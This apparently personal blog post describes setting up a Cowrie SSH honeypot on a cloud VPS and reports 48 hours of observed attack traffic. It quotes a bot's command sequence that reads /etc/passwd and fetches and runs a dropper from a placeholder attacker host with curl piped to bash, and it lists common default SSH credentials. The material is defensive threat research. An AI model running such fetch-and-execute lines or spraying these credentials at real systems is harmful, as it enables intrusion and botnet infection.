---
title: "Honeypot In The Cloud"
layout: "single"
date: 2025-03-10
showtoc: true
description: "Deploying a cloud honeypot to observe real-world attack traffic and study attacker behavior."
cover:
  image: "/images/honeymap.png"
  alt: "Honeypot In The Cloud"
---

A honeypot is a deliberately exposed system designed to attract attackers and collect intelligence on their behavior. Instead of defending a production system, you're standing up a decoy — and watching what happens when the world finds it.

In this post I'll walk through how I spun up a simple cloud honeypot on a VPS, what I observed in the first 48 hours, and what the data tells us about the current threat landscape.

### Why A Cloud Honeypot?

Running a honeypot at home is messy — your ISP can pull your connection, your home IP changes, and you risk exposing your local network. A cheap VPS fixes all of that. For around $5–6/month you get a static public IP, a clean environment, and no risk to anything important.

I used a low-spec VPS (1 vCPU, 1 GB RAM, 25 GB SSD) running Ubuntu 24.04 LTS. That's plenty for what we need.

### Setting Up The Honeypot

I used [Cowrie](https://github.com/cowrie/cowrie), an SSH and Telnet honeypot that emulates a real shell just convincingly enough to keep attackers engaged. It logs every command they run, every file they try to download, and every credential they attempt.

**Install dependencies:**
```bash
sudo apt update && sudo apt install -y python3-venv libssl-dev libffi-dev build-essential git
```

**Clone Cowrie and set up the virtual environment:**
```bash
git clone https://github.com/cowrie/cowrie
cd cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
```

**Configure Cowrie** (`cowrie.cfg`):
```ini
[honeypot]
hostname = prod-server-01
log_path = var/log/cowrie
download_path = var/lib/cowrie/downloads

[output_jsonlog]
enabled = true
logfile = var/log/cowrie/cowrie.json
```

By default Cowrie listens on port 2222. To redirect port 22 traffic there without running as root, use an `iptables` rule:
```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
```

Start Cowrie:
```bash
bin/cowrie start
```

That's it. Within minutes you'll see your first connection attempts in the log.

### What Happened In The First 48 Hours

The scanner traffic started within **4 minutes** of the VPS being provisioned. This is consistent with research showing the average time-to-first-scan for a new public IP is under 10 minutes.

Here's a breakdown of what I saw:

#### Credential Spraying
The overwhelming majority of traffic was automated SSH brute-force attempts. Common credential pairs tried:

| Username | Password |
|---|---|
| root | root |
| root | 123456 |
| admin | admin |
| ubuntu | ubuntu |
| pi | raspberry |
| user | password |

These come in fast — thousands of attempts per hour from rotating IPs across dozens of countries. The credential lists are clearly sourced from years of breach dumps.

#### Successful "Logins" And What Attackers Did
Cowrie accepts any password for a configurable fake account. Once inside the fake shell, most bots run the same sequence almost immediately:

```bash
uname -a
cat /proc/cpuinfo
cat /etc/passwd
wget http://[attacker-ip]/payload.sh
curl http://[attacker-ip]/payload.sh | bash
```

The pattern is always the same: fingerprint the machine, check if it's a VM or honeypot (they rarely detect Cowrie), then pull down and execute a dropper. Most of the droppers I captured were:

- **Mirai variants** — scanning for more vulnerable IoT devices and adding the machine to a botnet
- **XMRig coinminers** — cryptomining with the victim's CPU
- **Reverse shells** — establishing C2 access for later use

I safely downloaded all payloads into an isolated analysis VM — never on the honeypot host itself.

#### Geographic Distribution
The top source countries for connection attempts over 48 hours:

| Country | Attempts |
|---|---|
| China | 38% |
| United States | 14% |
| Russia | 11% |
| Netherlands | 8% |
| Germany | 6% |
| Other | 23% |

The US traffic is largely exit nodes and compromised cloud VMs — attackers love using US-based infrastructure to blend in.

### Analyzing The Data

Cowrie logs everything to JSON. A quick Python script to extract the top attempted usernames:

```python
import json
from collections import Counter

usernames = []
with open("cowrie.json") as f:
    for line in f:
        event = json.loads(line)
        if event.get("eventid") == "cowrie.login.failed":
            usernames.append(event["username"])

for name, count in Counter(usernames).most_common(10):
    print(f"{name}: {count}")
```

You can build the same for passwords, source IPs, commands run, and files downloaded. The data is rich.

### Takeaways

Running a honeypot for even a short window drives home a few things:

1. **Default credentials are exploited constantly.** If your SSH is exposed with a weak password, you will be compromised. Use key-based auth only.
2. **Scanners are fully automated.** Nobody is manually typing these commands — it's all scripted, all the time, at scale.
3. **Attackers fingerprint aggressively.** They check CPU count, OS version, and memory before deploying payloads — they're optimizing for real machines, not wasting resources.
4. **Cloud VMs are prime targets.** Public IPs in cloud ranges get hit faster and harder than residential IPs.

If you want to stand one up yourself, the full Cowrie documentation is excellent. Pair it with a log shipper and a Grafana dashboard and you can watch the attack map populate in real time.

*As always — only run honeypots on infrastructure you own or have explicit permission to use.*
